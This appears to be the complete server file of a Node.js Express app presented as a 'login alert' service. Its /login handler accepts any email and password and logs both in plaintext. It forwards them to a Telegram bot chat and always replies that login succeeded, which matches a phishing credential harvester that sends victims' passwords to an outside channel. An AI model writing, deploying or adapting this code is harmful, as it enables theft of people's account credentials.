require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.static(path.join(__dirname)));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram credentials
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Function to send message to Telegram
async function sendTelegramMessage(email, password) {
  try {
    const message = `🔔 New Login Alert!\n\n📧 Email: ${email}\n🔐 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });
    
    console.log('✅ Telegram message sent successfully!');
  } catch (error) {
    console.error('❌ Error sending Telegram message:', error.message);
  }
}

// Handle login form submission
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  console.log(`\n🔐 Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`);
  
  // Send notification to Telegram
  await sendTelegramMessage(email, password);
  
  // Send success response
  res.json({ 
    success: true, 
    message: 'Login successful! Check your Telegram for notification.' 
  });
});

// Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`\n🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 Telegram Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
  console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}\n`);
});
